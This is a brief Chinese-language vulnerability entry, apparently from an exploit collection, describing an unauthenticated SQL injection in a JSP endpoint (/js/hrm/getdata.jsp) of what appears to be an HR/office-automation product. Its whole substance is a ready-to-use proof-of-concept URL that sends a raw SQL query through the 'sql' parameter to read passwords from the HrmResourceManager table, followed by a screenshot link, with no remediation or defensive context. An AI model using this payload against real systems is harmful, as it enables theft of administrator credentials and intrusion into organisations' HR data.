### 前台SQL注入漏洞-/js/hrm/getdata.jsp
POC:
```
 /js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager
```

![image](https://user-images.githubusercontent.com/55024146/118272767-adc09a00-b4f5-11eb-9a7b-6fc0b4ea0616.png)

